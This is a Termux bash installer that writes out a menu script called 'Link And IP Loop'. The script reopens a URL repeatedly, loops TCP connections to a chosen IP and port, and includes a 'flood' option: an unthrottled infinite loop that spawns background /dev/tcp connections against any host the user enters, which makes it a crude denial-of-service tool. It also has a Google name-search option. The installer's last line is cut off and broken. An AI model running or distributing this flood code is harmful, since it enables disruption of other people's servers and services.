#!/data/data/com.termux/files/usr/bin/bash

# Installer for Link And IP Loop

# Colored header
clear
echo "====================================="
echo "       🔁 LINK AND IP LOOP 🔁        "
echo "====================================="

# Ask for language
echo "Select your language:"
echo "1 - English"
echo "2 - Russian"
read -p "Choose [1-2]: " lang_choice

# Set messages based on language
case $lang_choice in
  1) lang="EN";;
  2) lang="RU";;
  
esac

# Setup workspace
WORK_DIR="$HOME/LinkAndIPLoop"
DEMO_GIT_LINK="https://github.com/zhobinalex/Like-And-IP-Loop.git" 

mkdir -p "$WORK_DIR"
touch "$WORK_DIR/urls.txt"
touch "$WORK_DIR/ips.txt"
touch "$WORK_DIR/log.txt"

# Install required packages
echo "[*] Installing required packages..."
pkg update -y && pkg install -y openssh curl git netcat

# Copy main script
cat > "$WORK_DIR/link_and_ip_loop.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

# === Script Header ===
clear
echo "====================================="
echo "       🔁 LINK AND IP LOOP 🔁        "
echo "====================================="

menu() {
  echo "1. Reopen URL repeatedly"
  echo "2. Repeated connect to IP:Port"
  echo "3. Fast open host:port flood"
  echo "4. Search person"
  echo "0. Exit"
  read -p "Choose option [0-4]: " choice
  case $choice in
    1) repeat_open_url ;;
    2) connect_ip_port ;;
    3) fast_connect ;;
    4) find_person ;;
    0) exit 0 ;;
    *) echo "Invalid option"; sleep 1; menu ;;
  esac
}

repeat_open_url() {
  read -p "Enter URL: " url
  read -p "Speed (seconds): " speed
  read -p "Pause time (minutes): " pause_minutes
  pause_seconds=$((pause_minutes * 60))
  while true; do
    termux-open-url "$url"
    sleep "$speed"
    if [ "$pause_seconds" -gt 0 ]; then sleep "$pause_seconds"; fi
  done
}

connect_ip_port() {
  read -p "Enter IP: " ip
  read -p "Enter Port: " port
  read -p "Speed (seconds): " speed
  while true; do
    timeout 1 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null && echo "[✓] OK" || echo "[!] Fail"
    sleep "$speed"
  done
}

fast_connect() {
  read -p "Host/IP: " host
  read -p "Port: " port
  echo "Sending flood to $host:$port"
  while true; do
    timeout 0.3 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null &
  done
}

find_person() {
  read -p "First name: " fname
  read -p "Last name: " lname
  search_url="https://www.google.com/search?q=${fname}+${lname}"
  termux-open-url "$search_url"
  echo "Opened browser for search."
}

menu
EOF

# Make executable
chmod +x "$WORK_DIR/link_and_ip_loop.sh"

# Final message
echo
echo "✅ Installation complete!"
echo "👉 Run the script with:"
echo "   bash $WORK_DIR/link_and_ip_loop